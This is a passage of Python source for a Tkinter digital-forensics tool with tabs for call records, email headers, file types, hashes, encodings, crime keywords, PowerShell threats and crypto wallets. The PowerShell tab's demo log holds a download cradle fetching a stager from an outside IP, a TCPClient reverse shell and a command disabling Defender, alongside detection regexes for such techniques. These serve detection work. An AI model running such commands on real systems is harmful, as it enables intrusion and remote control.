"""
Remaining tabs for CyberSentinel v2.
Each module supports real file uploads.
"""
import tkinter as tk
from tkinter import filedialog, messagebox
import re, os, csv, json, hashlib, datetime
from collections import Counter
from modules.gui_theme import (COLORS, heading, label, btn, entry,
                                scrolled_tree, separator, text_area,
                                card_frame, section_label)

# ─────────────────────────────────────────────────────────────────────────────
#  CDR Analyzer
# ─────────────────────────────────────────────────────────────────────────────
class CDRTab(tk.Frame):
    def __init__(self, parent, custody, root):
        super().__init__(parent, bg=COLORS["bg"])
        self.custody = custody
        self._build()

    def _build(self):
        heading(self, "CDR Pattern Analyzer").pack(anchor="w", padx=16, pady=(14,4))
        label(self, "Upload a CSV with call records (CALLER,RECIPIENT,DURATION,TIMESTAMP) to find top communication pairs.", small=True).pack(anchor="w", padx=16)

        tr = tk.Frame(self, bg=COLORS["bg"])
        tr.pack(fill="x", padx=16, pady=8)
        btn(tr, "Upload CDR CSV", self._upload, color=COLORS["green"]).pack(side="left", padx=4)
        btn(tr, "Load Demo", self._demo, color=COLORS["txt2"]).pack(side="left", padx=4)
        btn(tr, "Paste Text", self._show_paste, color=COLORS["accent"]).pack(side="left", padx=4)

        self.paste_frame = tk.Frame(self, bg=COLORS["bg"])
        pf, self.paste_txt = text_area(self.paste_frame, height=5)
        pf.pack(fill="x")
        btn(self.paste_frame, "Analyze", self._parse_paste, color=COLORS["green"]).pack(anchor="e", pady=4)

        self.info_var = tk.StringVar(value="No data loaded")
        tk.Label(self, textvariable=self.info_var, bg=COLORS["bg"], fg=COLORS["txt2"],
                 font=("Consolas", 9)).pack(anchor="w", padx=16)

        cols = ("pair", "calls", "bar")
        heads = ("Communication Pair", "Calls", "Frequency")
        tf, self.tree = scrolled_tree(self, cols, heads, heights=20)
        self.tree.column("pair", width=350)
        self.tree.column("calls", width=80)
        self.tree.column("bar", width=300)
        tf.pack(fill="both", expand=True, padx=16, pady=(4,12))

    def _show_paste(self):
        if self.paste_frame.winfo_ismapped():
            self.paste_frame.pack_forget()
        else:
            self.paste_frame.pack(fill="x", padx=16, pady=4)

    def _upload(self):
        p = filedialog.askopenfilename(filetypes=[("CSV/Text", "*.csv *.txt"), ("All","*.*")])
        if not p: return
        with open(p, "r", errors="ignore") as f: text = f.read()
        self._analyze(text, os.path.basename(p))

    def _parse_paste(self):
        self._analyze(self.paste_txt.get("1.0","end"), "pasted")
        self.paste_frame.pack_forget()

    def _demo(self):
        demo = """+256700111222,+256701999888,342,2024-11-08 01:14
+256701999888,+256700111222,78,2024-11-08 01:55
+256700111222,+256702555444,19,2024-11-08 02:10
+256701999888,+256703777666,211,2024-11-08 02:22
+256700111222,+256701999888,445,2024-11-08 02:45
+256702555444,+256700111222,133,2024-11-08 03:01
+256701999888,+256700111222,290,2024-11-08 03:18
+256703777666,+256701999888,512,2024-11-08 04:00"""
        self._analyze(demo, "demo_cdr.csv")

    def _analyze(self, text, source):
        pairs = Counter()
        for line in text.splitlines():
            p = line.split(",")
            if len(p) < 2: continue
            a, b = p[0].strip(), p[1].strip()
            if a and b:
                pairs[tuple(sorted([a, b]))] += 1
        self.tree.delete(*self.tree.get_children())
        max_c = max(pairs.values(), default=1)
        for i, ((a, b), count) in enumerate(pairs.most_common(30)):
            bar = "█" * int(count / max_c * 30)
            tag = "CRITICAL" if i == 0 else "WARNING" if i < 3 else ""
            self.tree.insert("", "end", values=(f"{a}  ↔  {b}", count, bar), tags=(tag,))
        self.info_var.set(f"{len(pairs)} unique pairs from {source}")
        self.custody.log("CDR_ANALYZED", source, f"{len(pairs)} pairs")


# ─────────────────────────────────────────────────────────────────────────────
#  Email Header Trace
# ─────────────────────────────────────────────────────────────────────────────
class EmailTab(tk.Frame):
    def __init__(self, parent, custody, root):
        super().__init__(parent, bg=COLORS["bg"])
        self.custody = custody
        self._build()

    def _build(self):
        heading(self, "Email Header Trace").pack(anchor="w", padx=16, pady=(14,4))
        label(self, "Upload a .eml file or paste raw header text to trace phishing origins.", small=True).pack(anchor="w", padx=16)
        tr = tk.Frame(self, bg=COLORS["bg"])
        tr.pack(fill="x", padx=16, pady=8)
        btn(tr, "Upload .eml File", self._upload, color=COLORS["green"]).pack(side="left", padx=4)
        btn(tr, "Load Demo", self._demo, color=COLORS["txt2"]).pack(side="left", padx=4)

        pf, self.txt = text_area(self, height=7)
        pf.pack(fill="x", padx=16, pady=4)
        btn(self, "Analyze Header", self._analyze, color=COLORS["amber"]).pack(anchor="e", padx=16, pady=4)

        separator(self).pack(fill="x", padx=16, pady=4)
        self.result_frame = tk.Frame(self, bg=COLORS["bg"])
        self.result_frame.pack(fill="both", expand=True, padx=16, pady=4)

    def _upload(self):
        p = filedialog.askopenfilename(filetypes=[("Email files","*.eml *.txt *.msg"),("All","*.*")])
        if not p: return
        with open(p, "r", errors="ignore") as f: content = f.read()
        self.txt.delete("1.0","end"); self.txt.insert("1.0", content)
        self._analyze()

    def _demo(self):
        demo = """Received: from mail.attacker.ru (185.220.101.9) by mx.victim.com
Received: from [45.142.212.100] by mail.relay.net
From: "PayPal Security" <security@paypal-verify.xyz>
Reply-To: collect@tempmail.ru
To: victim@company.com
Subject: URGENT: Your account has been suspended
X-Originating-IP: 185.220.101.9
X-Mailer: PhishKit v3.2
X-SPF-Result: FAIL
X-DKIM-Result: NONE"""
        self.txt.delete("1.0","end"); self.txt.insert("1.0", demo)
        self._analyze()

    def _analyze(self):
        text = self.txt.get("1.0","end")
        for w in self.result_frame.winfo_children(): w.destroy()
        ips = list(dict.fromkeys(re.findall(r"\b(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})\b", text)))
        from modules.tab_ipgeo import IP_DB, RISK_COLORS
        fields = []
        fields.append(("Originating IPs", ", ".join(ips) or "None found",
                        COLORS["red"] if any(IP_DB.get(i,{}).get("risk")=="CRITICAL" for i in ips) else COLORS["txt"]))
        for pattern, key in [(r"^From:\s*(.+)", "From"), (r"^Reply-To:\s*(.+)", "Reply-To"),
                              (r"^Subject:\s*(.+)", "Subject"), (r"X-SPF-Result:\s*(\w+)", "SPF"),
                              (r"X-DKIM-Result:\s*(\w+)", "DKIM"), (r"X-Mailer:\s*(.+)", "Mailer")]:
            m = re.search(pattern, text, re.MULTILINE)
            if m:
                val = m.group(1).strip()
                sus = (key == "SPF" and val.upper()=="FAIL") or \
                      (key == "DKIM" and val.upper() in ("FAIL","NONE")) or \
                      (key == "Reply-To" and "@" in val) or \
                      (key == "Subject" and re.search(r"urgent|suspend|verify", val, re.I))
                fields.append((key, val, COLORS["red"] if sus else COLORS["txt"]))

        sus_ips = [i for i in ips if IP_DB.get(i,{}).get("risk")=="CRITICAL"]
        verdict = "PHISHING LIKELY" if sus_ips or any(f[2]==COLORS["red"] for f in fields) else "INCONCLUSIVE"
        vc = COLORS["red"] if "PHISHING" in verdict else COLORS["amber"]
        tk.Label(self.result_frame, text=f"VERDICT: {verdict}", bg=COLORS["bg"],
                 fg=vc, font=("Consolas",12,"bold")).pack(anchor="w", pady=4)
        for k, v, vc2 in fields:
            row = tk.Frame(self.result_frame, bg=COLORS["bg"])
            row.pack(fill="x", pady=1)
            tk.Label(row, text=f"{k}:", bg=COLORS["bg"], fg=COLORS["txt3"],
                     font=("Consolas",9), width=16, anchor="w").pack(side="left")
            tk.Label(row, text=v[:120], bg=COLORS["bg"], fg=vc2,
                     font=("Consolas",9), anchor="w").pack(side="left")
        self.custody.log("EMAIL_ANALYZED","header",f"Verdict: {verdict}")


# ─────────────────────────────────────────────────────────────────────────────
#  File Type ID (+ EXIF reuse)
# ─────────────────────────────────────────────────────────────────────────────
MAGIC_MAP = {
    bytes.fromhex("FFD8FF"):   "JPEG Image",
    bytes.fromhex("89504E47"): "PNG Image",
    bytes.fromhex("47494638"): "GIF Image",
    bytes.fromhex("25504446"): "PDF Document",
    bytes.fromhex("504B0304"): "ZIP / Office Archive",
    bytes.fromhex("1F8B"):     "GZIP Archive",
    bytes.fromhex("4D5A"):     "Windows EXE / DLL",
    bytes.fromhex("7F454C46"): "Linux ELF Executable",
    bytes.fromhex("D0CF11E0"): "MS Office 97-2003",
    bytes.fromhex("52494646"): "WAV / AVI Media",
    bytes.fromhex("377ABCAF"): "7-Zip Archive",
    bytes.fromhex("52617221"): "RAR Archive",
    bytes.fromhex("424D"):     "BMP Image",
    bytes.fromhex("000001BA"): "MPEG Video",
    bytes.fromhex("CAFEBABE"): "Java Class File",
}
EXT_EXPECTED = {
    ".jpg":"JPEG",".jpeg":"JPEG",".png":"PNG",".gif":"GIF",".pdf":"PDF",
    ".zip":"ZIP",".exe":"EXE",".dll":"EXE",".elf":"ELF",".bmp":"BMP",
    ".mp4":"MPEG",".avi":"WAV / AVI"
}

def detect_magic(data: bytes) -> str:
    for sig, name in MAGIC_MAP.items():
        if data[:len(sig)] == sig:
            return name
    return "Unknown / Plain Text"


class FileIDTab(tk.Frame):
    def __init__(self, parent, custody, root):
        super().__init__(parent, bg=COLORS["bg"])
        self.custody = custody
        self._build()

    def _build(self):
        heading(self, "File Type Identifier  +  EXIF Metadata").pack(anchor="w", padx=16, pady=(14,4))
        label(self, "Upload any file(s) — reads magic bytes to detect real type. JPEG/PNG also shows embedded metadata.", small=True).pack(anchor="w", padx=16)
        tr = tk.Frame(self, bg=COLORS["bg"])
        tr.pack(fill="x", padx=16, pady=8)
        btn(tr, "Upload File(s)", self._upload, color=COLORS["green"]).pack(side="left", padx=4)

        cols = ("filename","ext","detected","match","size","exif")
        heads = ("Filename","Extension","Detected Type","Status","Size","EXIF / Notes")
        tf, self.tree = scrolled_tree(self, cols, heads, heights=14)
        self.tree.column("filename",  width=180)
        self.tree.column("ext",       width=70)
        self.tree.column("detected",  width=160)
        self.tree.column("match",     width=120)
        self.tree.column("size",      width=80)
        self.tree.column("exif",      width=320)
        tf.pack(fill="both", expand=True, padx=16, pady=(4,12))

    def _upload(self):
        paths = filedialog.askopenfilenames(filetypes=[("All files","*.*")])
        if not paths: return
        for p in paths:
            try:
                with open(p,"rb") as f: data = f.read(64)
                detected = detect_magic(data)
                ext = os.path.splitext(p)[1].lower()
                size_kb = f"{os.path.getsize(p)/1024:.1f} KB"
                expected = EXT_EXPECTED.get(ext,"")
                mismatch = expected and not any(e.lower() in detected.lower() for e in [expected, expected[:3]])
                status = "MISMATCH" if mismatch else "OK"
                exif_info = self._try_exif(p) if detected in ("JPEG Image","PNG Image") else "—"
                tag = "SUS" if mismatch else "OK"
                self.tree.insert("","end",
                    values=(os.path.basename(p), ext, detected, status, size_kb, exif_info),
                    tags=(tag,))
                self.custody.log("FILE_ID", os.path.basename(p),
                                 f"{detected} — {status}")
            except Exception as e:
                self.tree.insert("","end", values=(os.path.basename(p),"","ERROR","—","—",str(e)))

    def _try_exif(self, path):
        try:
            from PIL import Image
            from PIL.ExifTags import TAGS
            img = Image.open(path)
            raw = img._getexif()
            if not raw: return "No EXIF"
            parts = []
            for tid, val in raw.items():
                tag = TAGS.get(tid, str(tid))
                if tag in ("Make","Model","DateTime","GPSInfo","Software"):
                    parts.append(f"{tag}={str(val)[:40]}")
            return " | ".join(parts[:4]) or "EXIF present"
        except ImportError:
            return "Install Pillow for EXIF"
        except Exception:
            return "No EXIF"


# ─────────────────────────────────────────────────────────────────────────────
#  Hash Verifier
# ─────────────────────────────────────────────────────────────────────────────
class HashTab(tk.Frame):
    def __init__(self, parent, custody, root):
        super().__init__(parent, bg=COLORS["bg"])
        self.custody = custody
        self._build()

    def _build(self):
        heading(self, "Hash Generator & Evidence Verifier").pack(anchor="w", padx=16, pady=(14,4))
        label(self, "Upload evidence files to compute SHA-256 / MD5 / SHA-1. Optionally provide a known hash to verify integrity.", small=True).pack(anchor="w", padx=16)

        vrow = tk.Frame(self, bg=COLORS["bg"])
        vrow.pack(fill="x", padx=16, pady=8)
        label(vrow, "Known hash to compare (optional):").pack(side="left")
        self.known_var = tk.StringVar()
        e = tk.Entry(vrow, textvariable=self.known_var, bg=COLORS["bg3"], fg=COLORS["txt"],
                     insertbackground=COLORS["accent"], font=("Consolas",9), relief="flat",
                     bd=4, width=70)
        e.pack(side="left", padx=8)

        tr = tk.Frame(self, bg=COLORS["bg"])
        tr.pack(fill="x", padx=16, pady=4)
        btn(tr, "Upload & Hash File(s)", self._upload, color=COLORS["green"]).pack(side="left", padx=4)

        cols = ("filename","size","sha256","sha1","md5","status")
        heads = ("Filename","Size","SHA-256","SHA-1","MD5","Status")
        tf, self.tree = scrolled_tree(self, cols, heads, heights=16)
        self.tree.column("filename", width=160)
        self.tree.column("size",     width=80)
        self.tree.column("sha256",   width=280)
        self.tree.column("sha1",     width=200)
        self.tree.column("md5",      width=180)
        self.tree.column("status",   width=110)
        tf.pack(fill="both", expand=True, padx=16, pady=(4,12))

    def _upload(self):
        paths = filedialog.askopenfilenames(filetypes=[("All files","*.*")])
        if not paths: return
        known = self.known_var.get().strip().lower()
        for p in paths:
            try:
                sha256 = hashlib.sha256()
                sha1   = hashlib.sha1()
                md5    = hashlib.md5()
                size   = 0
                with open(p,"rb") as f:
                    for chunk in iter(lambda: f.read(65536), b""):
                        sha256.update(chunk); sha1.update(chunk); md5.update(chunk)
                        size += len(chunk)
                h256 = sha256.hexdigest()
                h1   = sha1.hexdigest()
                hmd5 = md5.hexdigest()
                if known:
                    status = "MATCH" if known in (h256, h1, hmd5) else "MISMATCH"
                else:
                    status = "NOT VERIFIED"
                tag = "OK" if status=="MATCH" else "CRITICAL" if status=="MISMATCH" else "INFO"
                size_str = f"{size/1024:.1f} KB"
                self.tree.insert("","end",
                    values=(os.path.basename(p), size_str, h256, h1, hmd5, status),
                    tags=(tag,))
                self.custody.log("HASH_COMPUTED", os.path.basename(p),
                                 f"SHA256={h256[:16]}… Status={status}")
            except Exception as e:
                messagebox.showerror("Error", str(e))


# ─────────────────────────────────────────────────────────────────────────────
#  Encoding Identifier
# ─────────────────────────────────────────────────────────────────────────────
def try_decode(s: str) -> list:
    results = []
    s = s.strip()
    # Base64
    try:
        import base64
        d = base64.b64decode(s + "==").decode("utf-8")
        if d.isprintable() and len(d) > 2:
            results.append(("Base64", d, "HIGH"))
    except Exception: pass
    # Hex
    clean = s.replace(" ","").replace("\n","")
    if re.fullmatch(r"[0-9a-fA-F]+", clean) and len(clean) % 2 == 0 and len(clean) >= 6:
        try:
            d = bytes.fromhex(clean).decode("utf-8","replace")
            if d.isprintable():
                results.append(("Hexadecimal", d, "HIGH"))
        except Exception: pass
    # URL
    if "%" in s and re.search(r"%[0-9a-fA-F]{2}", s):
        try:
            from urllib.parse import unquote
            results.append(("URL Encoding", unquote(s), "HIGH"))
        except Exception: pass
    # Binary
    parts = s.strip().split()
    if all(re.fullmatch(r"[01]{8}", p) for p in parts) and len(parts) >= 2:
        try:
            d = "".join(chr(int(p,2)) for p in parts)
            if d.isprintable():
                results.append(("Binary", d, "MEDIUM"))
        except Exception: pass
    # ROT13
    rot = "".join(
        chr((ord(c)-65+13)%26+65) if c.isupper() else
        chr((ord(c)-97+13)%26+97) if c.islower() else c
        for c in s)
    if rot != s:
        results.append(("ROT13", rot, "MEDIUM"))
    return results


class EncodingTab(tk.Frame):
    def __init__(self, parent, custody, root):
        super().__init__(parent, bg=COLORS["bg"])
        self.custody = custody
        self._build()

    def _build(self):
        heading(self, "Encoding Identifier & Decoder").pack(anchor="w", padx=16, pady=(14,4))
        label(self, "Upload a text/log file or paste a string. Auto-detects Base64, Hex, URL, Binary, ROT13.", small=True).pack(anchor="w", padx=16)

        tr = tk.Frame(self, bg=COLORS["bg"])
        tr.pack(fill="x", padx=16, pady=8)
        btn(tr, "Upload Text File", self._upload, color=COLORS["green"]).pack(side="left", padx=4)
        for demo_val, demo_lbl in [("aGVsbG8gd29ybGQ=","Demo Base64"),
                                    ("68656c6c6f","Demo Hex"),
                                    ("Uryyb Jbeyq","Demo ROT13"),
                                    ("hello%20world","Demo URL")]:
            btn(tr, demo_lbl, lambda v=demo_val: self._decode_single(v),
                color=COLORS["txt2"]).pack(side="left", padx=4)

        pf, self.entry_txt = text_area(self, height=3)
        pf.pack(fill="x", padx=16, pady=4)
        btn(self, "Decode String", lambda: self._decode_single(self.entry_txt.get("1.0","end").strip()),
            color=COLORS["accent"]).pack(anchor="e", padx=16, pady=4)

        separator(self).pack(fill="x", padx=16, pady=4)

        cols = ("source","type","confidence","decoded")
        heads = ("Source","Encoding Type","Confidence","Decoded Value")
        tf, self.tree = scrolled_tree(self, cols, heads, heights=16)
        self.tree.column("source",     width=120)
        self.tree.column("type",       width=120)
        self.tree.column("confidence", width=90)
        self.tree.column("decoded",    width=480)
        tf.pack(fill="both", expand=True, padx=16, pady=(4,12))

    def _upload(self):
        p = filedialog.askopenfilename(filetypes=[("Text files","*.txt *.log *.csv"),("All","*.*")])
        if not p: return
        with open(p,"r",errors="ignore") as f: lines = f.readlines()
        count = 0
        for i, line in enumerate(lines):
            line = line.strip()
            if len(line) < 4: continue
            for enc_type, decoded, conf in try_decode(line):
                self.tree.insert("","end",
                    values=(f"Line {i+1}", enc_type, conf, decoded[:200]))
                count += 1
        self.custody.log("ENCODING_SCAN", os.path.basename(p), f"{count} encoded strings found")

    def _decode_single(self, s):
        if not s: return
        results = try_decode(s)
        if not results:
            messagebox.showinfo("Result", "No common encoding detected.")
            return
        for enc_type, decoded, conf in results:
            self.tree.insert("","end", values=("manual", enc_type, conf, decoded[:300]))
        self.custody.log("STRING_DECODED","manual_input", ", ".join(r[0] for r in results))


# ─────────────────────────────────────────────────────────────────────────────
#  Keyword Scanner
# ─────────────────────────────────────────────────────────────────────────────
TERROR_KW   = ["bomb","explosive","target","attack","martyrdom","jihad","weapon","assassination","sleeper","detonate"]
NARCO_KW    = ["cocaine","heroin","meth","fentanyl","cartel","shipment","kilo","distributor","supplier","hashish"]
FINANCIAL_KW= ["money laundering","shell company","offshore","wire transfer","hawala","crypto wallet","untraceable","structuring"]
CYBER_KW    = ["exploit","zero-day","rootkit","keylogger","c2 server","botnet","ransomware","payload","exfiltration","backdoor","privilege escalation","reverse shell"]
ALL_KW      = TERROR_KW + NARCO_KW + FINANCIAL_KW + CYBER_KW

class KeywordsTab(tk.Frame):
    def __init__(self, parent, custody, root):
        super().__init__(parent, bg=COLORS["bg"])
        self.custody = custody
        self._build()

    def _build(self):
        heading(self, "Suspicious Keyword Scanner").pack(anchor="w", padx=16, pady=(14,4))
        label(self, "Upload text files / documents. Scans for terrorism, narcotics, financial crime, and cyber crime keywords.", small=True).pack(anchor="w", padx=16)

        tr = tk.Frame(self, bg=COLORS["bg"])
        tr.pack(fill="x", padx=16, pady=8)
        btn(tr, "Upload File(s)", self._upload, color=COLORS["green"]).pack(side="left", padx=4)
        btn(tr, "Load Demo", self._demo, color=COLORS["txt2"]).pack(side="left", padx=4)
        label(tr, "Category:").pack(side="left", padx=(12,4))
        self.cat_var = tk.StringVar(value="all")
        for val, lbl in [("all","All"),("terror","Terrorism"),("narco","Narcotics"),("financial","Financial"),("cyber","Cyber")]:
            tk.Radiobutton(tr, text=lbl, variable=self.cat_var, value=val,
                           bg=COLORS["bg"], fg=COLORS["txt2"], selectcolor=COLORS["bg3"],
                           activebackground=COLORS["bg"], font=("Segoe UI",9)).pack(side="left", padx=4)

        self.total_var = tk.StringVar(value="0 hits")
        tk.Label(self, textvariable=self.total_var, bg=COLORS["bg"], fg=COLORS["red"],
                 font=("Consolas",10,"bold")).pack(anchor="w", padx=16)

        cols = ("source","line","keyword","category","context")
        heads = ("File","Line #","Keyword","Category","Context")
        tf, self.tree = scrolled_tree(self, cols, heads, heights=20)
        self.tree.column("source",   width=140)
        self.tree.column("line",     width=60)
        self.tree.column("keyword",  width=140)
        self.tree.column("category", width=110)
        self.tree.column("context",  width=420)
        tf.pack(fill="both", expand=True, padx=16, pady=(4,12))

    def _get_kws(self):
        c = self.cat_var.get()
        return {"terror":TERROR_KW,"narco":NARCO_KW,"financial":FINANCIAL_KW,"cyber":CYBER_KW}.get(c, ALL_KW)

    def _scan(self, text, source):
        kws = self._get_kws()
        hits = 0
        for i, line in enumerate(text.splitlines()):
            for kw in kws:
                if kw.lower() in line.lower():
                    cat = ("terrorism" if kw in TERROR_KW else "narcotics" if kw in NARCO_KW
                           else "financial" if kw in FINANCIAL_KW else "cyber")
                    self.tree.insert("","end",
                        values=(source, i+1, kw, cat, line.strip()[:160]),
                        tags=("CRITICAL",))
                    hits += 1
        return hits

    def _upload(self):
        paths = filedialog.askopenfilenames(filetypes=[("Text","*.txt *.log *.csv *.html *.json"),("All","*.*")])
        if not paths: return
        total = 0
        for p in paths:
            with open(p,"r",errors="ignore") as f: text = f.read()
            h = self._scan(text, os.path.basename(p))
            total += h
            self.custody.log("KEYWORD_SCAN", os.path.basename(p), f"{h} hits")
        self.total_var.set(f"{total} hits found across {len(paths)} file(s)")

    def _demo(self):
        demo = """We need to transfer the cocaine shipment before dawn.
The payload is ready. Execute the exploit on the target at 03:00.
Wire transfer to offshore shell company account confirmed.
The rootkit has been installed. C2 server is live.
Contact the supplier about the next kilo delivery."""
        h = self._scan(demo, "demo_document.txt")
        self.total_var.set(f"{h} hits found")
        self.custody.log("KEYWORD_SCAN","demo_document.txt",f"{h} hits")


# ─────────────────────────────────────────────────────────────────────────────
#  PowerShell Detector
# ─────────────────────────────────────────────────────────────────────────────
PS_SIGS = [
    (re.compile(r"EncodedCommand|-enc\s|FromBase64String", re.I), "Encoded Command",           "CRITICAL"),
    (re.compile(r"IEX\s*\(|Invoke-Expression", re.I),             "Invoke-Expression Injection","CRITICAL"),
    (re.compile(r"New-Object.*WebClient|DownloadString|DownloadFile", re.I), "Download Cradle", "CRITICAL"),
    (re.compile(r"Set-MpPreference.*Disable|DisableRealtimeMonitoring", re.I), "AMSI Bypass",  "CRITICAL"),
    (re.compile(r"TCPClient.*\d{4,5}|System\.Net\.Sockets", re.I), "Reverse Shell",            "CRITICAL"),
    (re.compile(r"whoami|net\s+user|ipconfig", re.I),              "Recon Commands",            "WARNING"),
    (re.compile(r"Reflection\.Assembly|LoadWithPartialName", re.I),"Assembly Reflection",       "WARNING"),
    (re.compile(r"reg\s+add.*Run|CurrentVersion\\Run", re.I),      "Registry Persistence",      "WARNING"),
]

class PowerShellTab(tk.Frame):
    def __init__(self, parent, custody, root):
        super().__init__(parent, bg=COLORS["bg"])
        self.custody = custody
        self._build()

    def _build(self):
        heading(self, "PowerShell Threat Detector").pack(anchor="w", padx=16, pady=(14,4))
        label(self, "Upload Windows Event logs, PowerShell transcripts, or .evtx text exports.", small=True).pack(anchor="w", padx=16)
        tr = tk.Frame(self, bg=COLORS["bg"])
        tr.pack(fill="x", padx=16, pady=8)
        btn(tr, "Upload Log File(s)", self._upload, color=COLORS["green"]).pack(side="left", padx=4)
        btn(tr, "Load Demo", self._demo, color=COLORS["txt2"]).pack(side="left", padx=4)
        btn(tr, "Paste Text", self._show_paste, color=COLORS["accent"]).pack(side="left", padx=4)

        self.paste_frame = tk.Frame(self, bg=COLORS["bg"])
        pf, self.paste_txt = text_area(self.paste_frame, height=5)
        pf.pack(fill="x")
        btn(self.paste_frame, "Analyze", self._parse_paste, color=COLORS["green"]).pack(anchor="e", pady=4)

        self.total_var = tk.StringVar(value="0 threats")
        tk.Label(self, textvariable=self.total_var, bg=COLORS["bg"], fg=COLORS["red"],
                 font=("Consolas",10,"bold")).pack(anchor="w", padx=16)

        cols = ("source","line","severity","threat","context")
        heads = ("File","Line #","Severity","Threat Type","Log Line")
        tf, self.tree = scrolled_tree(self, cols, heads, heights=18)
        self.tree.column("source",   width=130)
        self.tree.column("line",     width=60)
        self.tree.column("severity", width=90)
        self.tree.column("threat",   width=200)
        self.tree.column("context",  width=440)
        tf.pack(fill="both", expand=True, padx=16, pady=(4,12))

    def _show_paste(self):
        if self.paste_frame.winfo_ismapped(): self.paste_frame.pack_forget()
        else: self.paste_frame.pack(fill="x", padx=16, pady=4)

    def _parse_paste(self):
        self._scan(self.paste_txt.get("1.0","end"), "pasted_log")
        self.paste_frame.pack_forget()

    def _upload(self):
        paths = filedialog.askopenfilenames(filetypes=[("Log files","*.log *.txt *.evtx *.xml"),("All","*.*")])
        for p in paths:
            with open(p,"r",errors="ignore") as f: text = f.read()
            self._scan(text, os.path.basename(p))

    def _scan(self, text, source):
        hits = 0
        for i, line in enumerate(text.splitlines()):
            for pat, name, sev in PS_SIGS:
                if pat.search(line):
                    self.tree.insert("","end",
                        values=(source, i+1, sev, name, line.strip()[:180]),
                        tags=(sev,))
                    hits += 1
        self.total_var.set(f"{hits} threats detected")
        self.custody.log("PS_SCAN", source, f"{hits} threats")
        return hits

    def _demo(self):
        demo = """2024-11-08 02:21:05 EventID=4104 powershell.exe -EncodedCommand SQBFAFgA
2024-11-08 02:21:07 EventID=4104 IEX (New-Object Net.WebClient).DownloadString('http://185.220.101.9/stager.ps1')
2024-11-08 02:22:01 EventID=4688 cmd.exe /c whoami /all && net user
2024-11-08 02:22:11 EventID=4104 Set-MpPreference -DisableRealtimeMonitoring $true
2024-11-08 02:22:44 EventID=4104 $client = New-Object System.Net.Sockets.TCPClient('185.220.101.9',4444)"""
        self._scan(demo, "demo_event_log.evtx")


# ─────────────────────────────────────────────────────────────────────────────
#  Crypto Wallet Detector
# ─────────────────────────────────────────────────────────────────────────────
WALLET_PATTERNS = [
    ("Bitcoin (BTC)",  re.compile(r"\b([13][a-km-zA-HJ-NP-Z1-9]{25,34}|bc1[a-z0-9]{39,59})\b")),
    ("Ethereum (ETH)", re.compile(r"\b(0x[a-fA-F0-9]{40})\b")),
    ("Litecoin (LTC)", re.compile(r"\b([LM3][a-km-zA-HJ-NP-Z1-9]{26,33})\b")),
    ("Monero (XMR)",   re.compile(r"\b(4[0-9AB][1-9A-HJ-NP-Za-km-z]{93})\b")),
]

class CryptoTab(tk.Frame):
    def __init__(self, parent, custody, root):
        super().__init__(parent, bg=COLORS["bg"])
        self.custody = custody
        self._build()

    def _build(self):
        heading(self, "Crypto Wallet Address Detector").pack(anchor="w", padx=16, pady=(14,4))
        label(self, "Upload seized documents, chat exports, or any text files. Detects BTC, ETH, LTC, XMR addresses.", small=True).pack(anchor="w", padx=16)
        tr = tk.Frame(self, bg=COLORS["bg"])
        tr.pack(fill="x", padx=16, pady=8)
        btn(tr, "Upload File(s)", self._upload, color=COLORS["green"]).pack(side="left", padx=4)
        btn(tr, "Load Demo", self._demo, color=COLORS["txt2"]).pack(side="left", padx=4)
        btn(tr, "Paste Text", self._show_paste, color=COLORS["accent"]).pack(side="left", padx=4)

        self.paste_frame = tk.Frame(self, bg=COLORS["bg"])
        pf, self.paste_txt = text_area(self.paste_frame, height=4)
        pf.pack(fill="x")
        btn(self.paste_frame, "Scan", self._parse_paste, color=COLORS["green"]).pack(anchor="e", pady=4)

        self.total_var = tk.StringVar(value="0 addresses found")
        tk.Label(self, textvariable=self.total_var, bg=COLORS["bg"], fg=COLORS["amber"],
                 font=("Consolas",10,"bold")).pack(anchor="w", padx=16)

        cols = ("source","coin","address","line")
        heads = ("Source","Coin","Wallet Address","Context Line")
        tf, self.tree = scrolled_tree(self, cols, heads, heights=18)
        self.tree.column("source",  width=130)
        self.tree.column("coin",    width=120)
        self.tree.column("address", width=380)
        self.tree.column("line",    width=220)
        tf.pack(fill="both", expand=True, padx=16, pady=(4,12))

    def _show_paste(self):
        if self.paste_frame.winfo_ismapped(): self.paste_frame.pack_forget()
        else: self.paste_frame.pack(fill="x", padx=16, pady=4)

    def _parse_paste(self):
        self._scan(self.paste_txt.get("1.0","end"), "pasted")
        self.paste_frame.pack_forget()

    def _upload(self):
        paths = filedialog.askopenfilenames(filetypes=[("Text files","*.txt *.log *.csv *.json *.html"),("All","*.*")])
        for p in paths:
            with open(p,"r",errors="ignore") as f: text = f.read()
            self._scan(text, os.path.basename(p))

    def _scan(self, text, source):
        count = 0
        for i, line in enumerate(text.splitlines()):
            for coin, pat in WALLET_PATTERNS:
                for m in pat.finditer(line):
                    self.tree.insert("","end",
                        values=(source, coin, m.group(1), line.strip()[:100]),
                        tags=("WARNING",))
                    count += 1
        self.total_var.set(f"{count} wallet address(es) found")
        if count: self.custody.log("CRYPTO_DETECTED", source, f"{count} addresses")
        return count

    def _demo(self):
        demo = """Send 0.5 BTC to 1A1zP1eP5QGefi2DMPTfTL5SLmv7Divf
ETH wallet: 0x742d35Cc6634C0532925a3b8D4C9B2d8F5A7b98A
LTC: LVg2kA8rBhZCLrQ3LQTXh4gGSuMr6a9Vy
Confirm tx 3J98t1WpEZ73CNmQviecrnyiWrnqRhWNLy"""
        self._scan(demo, "demo_chat.txt")


# ─────────────────────────────────────────────────────────────────────────────
#  Network Packet Analyzer
# ─────────────────────────────────────────────────────────────────────────────
class NetworkTab(tk.Frame):
    def __init__(self, parent, custody, root):
        super().__init__(parent, bg=COLORS["bg"])
        self.custody = custody
        self._build()

    def _build(self):
        heading(self, "Network Packet Analyzer").pack(anchor="w", padx=16, pady=(14,4))
        label(self, "Upload Wireshark CSV export or packet log. For live capture run the Python backend (requires root/admin).", small=True).pack(anchor="w", padx=16)
        tr = tk.Frame(self, bg=COLORS["bg"])
        tr.pack(fill="x", padx=16, pady=8)
        btn(tr, "Upload Wireshark CSV", self._upload, color=COLORS["green"]).pack(side="left", padx=4)
        btn(tr, "Load Demo Packets",    self._demo,   color=COLORS["txt2"]).pack(side="left", padx=4)
        self.sus_var = tk.BooleanVar()
        tk.Checkbutton(tr, text="Suspicious only", variable=self.sus_var, command=self._filter,
                       bg=COLORS["bg"], fg=COLORS["txt2"], selectcolor=COLORS["bg3"],
                       activebackground=COLORS["bg"], font=("Segoe UI",9)).pack(side="left", padx=8)

        cols = ("time","proto","src","dst","flags","score","info")
        heads = ("Time","Proto","Source","Destination","Flags","Threat","Info")
